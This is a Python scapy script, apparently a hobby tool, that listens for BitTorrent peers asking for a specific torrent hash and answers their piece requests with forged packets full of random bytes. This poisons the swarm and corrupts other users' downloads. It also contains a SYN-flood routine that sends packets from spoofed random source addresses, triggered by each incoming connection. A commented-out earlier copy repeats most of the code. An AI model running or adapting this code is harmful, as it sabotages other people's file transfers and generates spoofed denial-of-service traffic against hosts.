from http.client import OK

from scapy.all import *
import binascii
from scapy.layers.inet import TCP, IP, Ether
from enum import Enum

from scapy.layers.inet6 import IPv6

peerID = "2d5554333535532d6eafd5d74e2903d7f8073bdf"
bittorrent_iden = b"13426974546f7272656e742070726f746f636f6c"  # 19bittorrent


class BTKind(Enum):
    HANDSHAKE = -1
    CHOKE = 0
    UNCHOKE = 1
    INTERESTED = 2
    NOT_INTERESTED = 3
    HAVE = 4
    BITFIELD = 5
    REQUEST = 6
    PIECE = 7
    CANCEL = 8
    PORT = 9
    HAVE_ALL = 14
    HAVE_NONE = 15
    ALLOW_FAST = 17
    EXTENDED = 20


name_map = {0: "CHOKE", 1: "UNCHOKE", 2: "INTERESTED", 3: "NOTINTERESTED", 4: "HAVE", 5: "BITFIELD",
            6: "REQUEST", 7: "PIECE", 8: "CANCEL", 9: "PORT", 14: "HAVEALL", 15: "HAVENONE",
            17: "ALLOWFAST", 20: "EXTENDED"}

response_set = {-1, 2, 6, 9}


def BTparser(payload: bytes):
    bittorrents = []
    try:
        while len(payload) != 0:
            length = int.from_bytes(payload[:4], byteorder='big')
            bittorrents.append((BASEBT(payload[:4 + length]), payload[:4 + length]))
            payload = payload[4 + length:]
        return bittorrents
    except:
        return []


class Poison(AnsweringMachine):
    def __init__(self):
        super(Poison, self).__init__()
        self.addressset = set()
        self.hashset = set()
        self.handshakeset = set()
        self.hashset.add("cfe5896a438fc3eaeb8c539aafe4f916c60ef6d0")
        self.kinds = []
        self.pkts = []
        self.wait_ack_map = dict()
        self.syn = False

    def is_request(self, pkt: Packet):
        # 接收到handshake后回一个handshake ,一个 haveall,收到port后回一个port,回一个unchoke,收到request piece后回一个piece,诶嘿嘿
        self.pkts = []
        self.kinds = []
        if pkt.haslayer(TCP):
            if pkt[TCP].dport == 6886:
                print(f"get {pkt[TCP].dport} message")
            if IPv6 in pkt:
                src = pkt.getlayer(IPv6).src
                dst = pkt.getlayer(IPv6).dst
                if dst.strip() != get_if_addr6(conf.iface):
                    return False
            else:
                src = pkt.getlayer(IP).src
                dst = pkt.getlayer(IP).dst
                if dst.strip() != get_if_addr(conf.iface):
                    return False
            sport = pkt.getlayer(TCP).sport
            tcp = pkt.getlayer(TCP)
            if tcp.flags & 0b10:
                self.syn = True
                return True
            else:
                self.syn = False
            if tcp.payload is not None:
                payload = bytes(tcp.payload)
                if binascii.b2a_hex(payload).startswith(bittorrent_iden):
                    pkt_ = HANDSHAKE(payload)
                    if binascii.b2a_hex(pkt_.getfieldval("SHA1")) in self.hashset:
                        self.kinds.append(BTKind.HANDSHAKE)
                        # self.handshakeset.add(pkt.getlayer(IP).src)
                        self.pkts.append(pkt_)
                        return True
                    else:
                        return False
                elif (src, sport) in self.addressset or src in self.handshakeset:  # request piece ..........
                    bittorrents = BTparser(payload)
                    response_flag = False
                    for pkt, payload in bittorrents:
                        if pkt.length == 0 and self.wait_ack_map.get(src):
                            continue
                        type_ = pkt.getfieldval("type")
                        if type_ in response_set:
                            if type_ in name_map.keys():
                                self.pkts.append(globals()[name_map[type_]](payload))
                                self.kinds.append(type_)
                                response_flag = True
                            else:
                                print(f"no such packet: {type_}")
                                continue
                    return response_flag
                else:
                    return False
            return False
        else:
            return False

    def make_reply(self, pkt):
        smac = pkt.getlayer(Ether).src
        dmac = pkt.getlayer(Ether).dst
        if IPv6 in pkt:
            src = pkt.getlayer(IPv6).src
            dst = pkt.getlayer(IPv6).dst
        else:
            src = pkt.getlayer(IP).src
            dst = pkt.getlayer(IP).dst
        sport = pkt.getlayer(TCP).sport
        dport = pkt.getlayer(TCP).dport
        tcp = pkt.getlayer(TCP)
        # -1 2 3 6 9 handshake interested not_interested request port
        if self.syn:
            (Ether() / IP(src=dst, dst=src, flags=0) / TCP(sport=dport, dport=sport, flags='SA',
                                                           ack=tcp.seq + 1, seq=0)).show2()
            synFlood("127.0.0.1")
            return (Ether() / IP(src=dst, dst=src, flags=0) / TCP(sport=dport, dport=sport, flags='SA',
                                                                  ack=tcp.seq + 1, seq=0))
        result = Ether(src=dmac, dst=smac) / IP(src=dst, dst=src) / TCP(sport=dport, dport=sport,
                                                                        ack=pkt.seq + len(tcp.payload), seq=tcp.ack)
        response = []
        for i in range(len(self.pkts)):
            bittorrent = self.pkts[i]
            kind = self.kinds[i]
            if kind == BTKind.HANDSHAKE:
                self.handshakeset.add(src)
                hand = HANDSHAKE(Name_Length=19,
                                 Protocol_Name=bittorrent.Protocol_Name,
                                 Reserved_Extension_Bytes=bittorrent.Reserved_Extension_Bytes,
                                 SHA1=bittorrent.SHA1,
                                 Peer_ID=peerID)
                self.wait_ack_map[src] = True
                response.append(hand)
            elif kind == BTKind.INTERESTED:
                pkt_unchoke = UNCHOKE(length=1)
                response.append(pkt_unchoke)
            elif kind == BTKind.REQUEST:
                pkt_piece = PIECE(length=bittorrent.Piece_len + 9,
                                  Piece_index=bittorrent.Piece_index,
                                  Begin_offset_of_piece=bittorrent.Begin_offset_of_piece,
                                  Data_in_a_piece=random.randbytes(length=bittorrent.Piece_len))
                response.append(pkt_piece)
            elif kind == BTKind.PORT:
                pkt_port = PORT(length=3, port=dport)
                response.append(pkt_port)
        for i in range(len(response)):
            result /= response[i]
        return result


def synFlood(ip):
    src = '%i.%i.%i.%i' % (
        random.randint(1, 255),
        random.randint(1, 255),
        random.randint(1, 255),
        random.randint(1, 255)
    )
    # 构造随机的端口
    sport = random.randint(1024, 65535)
    IPlayer = IP(src=src, dst=ip)
    TCPlayer = TCP(sport=sport, dport=6553, flags="S")
    packet = IPlayer / TCPlayer
    send(packet, verbose=False)
    print(f"send syn from {src}")


class HANDSHAKE(Packet):
    name = "HandShakePacket"
    fields_desc = [
        ByteField("Name_Length", 19),
        StrFixedLenField("Protocol_Name", "BitTorrent protocol", length=19),
        XStrFixedLenField("Reserved_Extension_Bytes", None, length=8),
        XStrFixedLenField("SHA1", None, length=20),
        XStrFixedLenField("Peer_ID", peerID, length=20),
    ]


class UNCHOKE(Packet):
    name = "UnChoke Packet"
    fields_desc = [
        IntField("length", None),
        ByteEnumField("type", BTKind.UNCHOKE, name_map)
    ]


class CHOKE(Packet):
    name = "Choke Packet"
    fields_desc = [
        IntField("length", None),
        ByteEnumField("type", BTKind.CHOKE, name_map)
    ]


class INTERESTED(Packet):
    name = "Interested Packet"
    fields_desc = [
        IntField("length", None),
        ByteEnumField("type", BTKind.INTERESTED, name_map)
    ]


class NOTINTERESTED(Packet):
    name = "Not Interested Packet"
    fields_desc = [
        IntField("length", None),
        ByteEnumField("type", BTKind.NOT_INTERESTED, name_map)
    ]


class HAVEALL(Packet):
    name = "Have All Packet"
    fields_desc = [
        IntField("length", None),
        ByteEnumField("type", BTKind.HAVE_ALL, name_map)
    ]


class PORT(Packet):
    name = "Port Packet"
    fields_desc = [
        IntField("length", None),
        ByteEnumField("type", BTKind.PORT, name_map),
        ShortEnumField("port", 20, TCP_SERVICES)
    ]


class PIECE(Packet):
    name = "Piece Packet"
    fields_desc = [
        IntField("length", None),
        ByteEnumField("type", BTKind.PIECE, name_map),
        XIntField("Piece_index", None),
        XIntField("Begin_offset_of_piece", None),
        XStrField("Data_in_a_piece", None)
    ]


class REQUESTPIECE(Packet):
    name = "Request Piece Packet"
    fields_desc = [
        IntField("length", None),
        ByteEnumField("type", BTKind.PIECE, name_map),
        XIntField("Piece_index", None),
        XIntField("Begin_offset_of_piece", None),
        XIntField("Piece_len", None)
    ]


class BASEBT(Packet):
    name = "Base Bittorrent Packet"
    fields_desc = [
        IntField("length", None),
        ByteEnumField("type", BTKind.PIECE, name_map)
    ]


# class

if __name__ == "__main__":
    Poison()()

# from scapy.all import *
# import binascii
# from scapy.layers.inet import TCP, IP
# from enum import Enum
#
# from scapy.layers.inet6 import IPv6
#
# peerID = binascii.b2a_hex(b"-TR2920-70c7wdd0hkuv")
# bittorrent_iden = b"13426974546f7272656e742070726f746f636f6c"  # 19bittorrent
#
#
# class BTKind(Enum):
#     SYN = -2
#     HANDSHAKE = -1
#     CHOKE = 0
#     UNCHOKE = 1
#     INTERESTED = 2
#     NOT_INTERESTED = 3
#     HAVE = 4
#     BITFIELD = 5
#     REQUEST = 6
#     PIECE = 7
#     CANCEL = 8
#     PORT = 9
#     HAVE_ALL = 14
#     HAVE_NONE = 15
#     ALLOW_FAST = 17
#     EXTENDED = 20
#
#
# name_map = {0: "CHOKE", 1: "UNCHOKE", 2: "INTERESTED", 3: "NOTINTERESTED", 4: "HAVE", 5: "BITFIELD",
#             6: "REQUEST", 7: "PIECE", 8: "CANCEL", 9: "PORT", 14: "HAVEALL", 15: "HAVENONE",
#             17: "ALLOWFAST", 20: "EXTENDED"}
#
# response_set = {-1, 2, 6, 9}
#
#
# def BTparser(payload: bytes):
#     bittorrents = []
#     try:
#         while len(payload) != 0:
#             length = int.from_bytes(payload[:4], byteorder='big')
#             bittorrents.append((BASEBT(payload[:4 + length]), payload[:4 + length]))
#             payload = payload[4 + length:]
#         return bittorrents
#     except:
#         return []
#
#
# class Poison(AnsweringMachine):
#     def __init__(self):
#         super(Poison, self).__init__()
#         self.addressset = set()
#         self.hashset = set()
#         self.handshakeset = set()
#         self.kinds = []
#         self.pkts = []
#         self.wait_ack_map = dict()
#         self.SYN = False
#
#     def is_request(self, pkt: Packet):
#         # 接收到handshake后回一个handshake ,一个 haveall,收到port后回一个port,回一个unchoke,收到request piece后回一个piece,诶嘿嘿
#         if IPv6 in pkt:
#             src = pkt.getlayer(IPv6).src
#         else:
#             src = pkt.getlayer(IP).src
#         sport = pkt.getlayer(TCP).sport
#         self.pkts = []
#         self.kinds = []
#         if pkt.haslayer(TCP):
#             tcp = pkt.getlayer(TCP)
#             if tcp.flags.SYN:
#                 self.SYN = False
#                 return True
#             if tcp.payload is not None:
#                 payload = tcp.payload.raw_packet_cache
#                 if binascii.b2a_hex(payload).startswith(bittorrent_iden):
#                     pkt_ = HANDSHAKE(payload)
#                     if binascii.b2a_hex(pkt_.getfieldval("SHA1")) in self.hashset:
#                         self.kinds.append(BTKind.HANDSHAKE)
#                         # self.handshakeset.add(pkt.getlayer(IP).src)
#                         self.pkts.append(pkt_)
#                         return True
#                     else:
#                         return False
#                 elif (src, sport) in self.addressset or src in self.handshakeset:  # request piece ..........
#                     bittorrents = BTparser(payload)
#                     response_flag = False
#                     for pkt, payload in bittorrents:
#                         if pkt.length == 0 and self.wait_ack_map.get(src):
#                             continue
#                         type_ = pkt.getfieldval("type")
#                         if type_ in response_set:
#                             if type_ in name_map.keys():
#                                 self.pkts.append(globals()[name_map[type_]](payload))
#                                 self.kinds.append(type_)
#                                 response_flag = True
#                             else:
#                                 print(f"no such packet: {type_}")
#                                 continue
#                     return response_flag
#                 else:
#                     return False
#             return False
#         else:
#             return False
#
#     def make_reply(self, pkt):
#         if self.SYN:
#             self.SYN = False
#             return BASEBT(legth=1)
#         if IPv6 in pkt:
#             src = pkt.getlayer(IPv6).src
#         else:
#             src = pkt.getlayer(IP).src
#         sport = pkt.getlayer(TCP).sport
#         dport = pkt.getlayer(TCP).dport
#         # -1 2 3 6 9 handshake interested not_interested request port
#         response = []
#         for i in range(len(self.pkts)):
#             bittorrent = self.pkts[i]
#             kind = self.kinds[i]
#             if kind == BTKind.HANDSHAKE:
#                 self.handshakeset.add(src)
#                 hand = HANDSHAKE(Name_Length=19,
#                                  Protocol_Name=bittorrent.Protocol_Name,
#                                  Reserved_Extension_Bytes=bittorrent.Reserved_Extension_Bytes,
#                                  SHA1=bittorrent.SHA1,
#                                  Peer_ID=peerID)
#                 self.wait_ack_map[src] = True
#                 response.append(hand)
#             elif kind == BTKind.INTERESTED:
#                 pkt_unchoke = UNCHOKE(length=1)
#                 response.append(pkt_unchoke)
#             elif kind == BTKind.REQUEST:
#                 pkt_piece = PIECE(length=bittorrent.Piece_len + 9,
#                                   Piece_index=bittorrent.Piece_index,
#                                   Begin_offset_of_piece=bittorrent.Begin_offset_of_piece,
#                                   Data_in_a_piece=random.randbytes(bittorrent.Piece_len))
#                 response.append(pkt_piece)
#             elif kind == BTKind.PORT:
#                 pkt_port = PORT(length=3, port=dport)
#                 response.append(pkt_port)
#         result = None
#         for i in range(len(response)):
#             if i == 0:
#                 result = response[i]
#             else:
#                 result /= response[i]
#         return result
#
#
# class HANDSHAKE(Packet):
#     name = "HandShakePacket"
#     fields_desc = [
#         ByteField("Name_Length", 19),
#         StrFixedLenField("Protocol_Name", "BitTorrent protocol", length=19),
#         XStrFixedLenField("Reserved_Extension_Bytes", None, length=8),
#         XStrFixedLenField("SHA1", None, length=20),
#         XStrFixedLenField("Peer_ID", peerID, length=20),
#     ]
#
#
# class UNCHOKE(Packet):
#     name = "UnChoke Packet"
#     fields_desc = [
#         IntField("length", None),
#         ByteEnumField("type", BTKind.UNCHOKE, name_map)
#     ]
#
#
# class CHOKE(Packet):
#     name = "Choke Packet"
#     fields_desc = [
#         IntField("length", None),
#         ByteEnumField("type", BTKind.CHOKE, name_map)
#     ]
#
#
# class INTERESTED(Packet):
#     name = "Interested Packet"
#     fields_desc = [
#         IntField("length", None),
#         ByteEnumField("type", BTKind.INTERESTED, name_map)
#     ]
#
#
# class NOTINTERESTED(Packet):
#     name = "Not Interested Packet"
#     fields_desc = [
#         IntField("length", None),
#         ByteEnumField("type", BTKind.NOT_INTERESTED, name_map)
#     ]
#
#
# class HAVEALL(Packet):
#     name = "Have All Packet"
#     fields_desc = [
#         IntField("length", None),
#         ByteEnumField("type", BTKind.HAVE_ALL, name_map)
#     ]
#
#
# class PORT(Packet):
#     name = "Port Packet"
#     fields_desc = [
#         IntField("length", None),
#         ByteEnumField("type", BTKind.PORT, name_map),
#         ShortEnumField("port", 20, TCP_SERVICES)
#     ]
#     TCP
#
#
# class PIECE(Packet):
#     name = "Piece Packet"
#     fields_desc = [
#         IntField("length", None),
#         ByteEnumField("type", BTKind.PIECE, name_map),
#         XIntField("Piece_index", None),
#         XIntField("Begin_offset_of_piece", None),
#         XStrField("Data_in_a_piece", None)
#     ]
#
#
# class REQUESTPIECE(Packet):
#     name = "Request Piece Packet"
#     fields_desc = [
#         IntField("length", None),
#         ByteEnumField("type", BTKind.PIECE, name_map),
#         XIntField("Piece_index", None),
#         XIntField("Begin_offset_of_piece", None),
#         XIntField("Piece_len", None)
#     ]
#
#
# class BASEBT(Packet):
#     name = "Base Bittorrent Packet"
#     fields_desc = [
#         IntField("length", None),
#         ByteEnumField("type", BTKind.PIECE, name_map)
#     ]
# # class
